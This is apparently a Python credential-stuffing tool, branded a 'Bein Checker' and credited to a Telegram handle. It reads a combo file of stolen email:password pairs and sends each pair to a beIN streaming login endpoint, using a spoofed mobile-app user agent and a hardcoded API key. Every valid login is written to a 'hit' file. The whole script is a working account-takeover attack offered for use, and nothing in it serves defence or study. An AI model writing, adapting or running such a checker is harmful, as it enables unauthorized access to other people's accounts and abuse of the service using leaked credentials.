from datetime import datetime
import sys
import requests 
from cfonts import render, say
import os
import webbrowser
import os
import time
try:
    pass
except:
    os.system('pip install python-cfonts')
    
import requests
import sys


    

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] TeleGram  : {B} @Roox_00    |
|{Z}[+] Channel  : {B}JED ~ ARCHIVE |
|{Z}[+] Tool  : {B} Bein Checker |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')






class valentia:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.url = "https://proxies.bein-mena-production.eu-west-2.tuc.red/proxy/login"
        self.headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Connection": "keep-alive",
            "Host": "proxies.bein-mena-production.eu-west-2.tuc.red",
            "User-Agent": "beIN Connect/77 CFNetwork/1325.0.1 Darwin/21.1.0",
            "X-AN-WebService-IdentityKey": "B7tedrustev2ves5usa6h7zez5praF5w"
        }    
    def login(self):
        data = {"email": self.email, "password": self.password}
        response = requests.post(self.url, data=data, headers=self.headers)
        
        if 'status":true' in response.text:
            print(f'  Giris Basarili ✅ {self.email} {self.password}  ')
            print("\x1b[1;39m—" * 60)
            self.save_hit()
        else:
            print(f' Giriş Başarısız ❌ {self.email} {self.password} ')   
            print("\x1b[1;39m—" * 60) 
    def save_hit(self):
        with open('Valentia_bein_hit.txt', 'a') as file:
            file.write(f"{self.email}:{self.password}\n")

class RooxCan:
    def __init__(self, valentiayol):
        self.valentiayol = valentiayol    
    def Roox_kral(self):
        with open(self.valentiayol) as file:
            for line in file:
                try:
                    email, password = line.strip().split(':')
                    login_instance = valentia(email, password)
                    login_instance.login()
                except Exception:
                    continue

if __name__ == "__main__":
    valentiayol = input(" — Combo Yolu Giriniz  : ")
    print("\x1b[1;39m—" * 60)
    processor = RooxCan(valentiayol)
    processor.Roox_kral()
    
  # @valentia
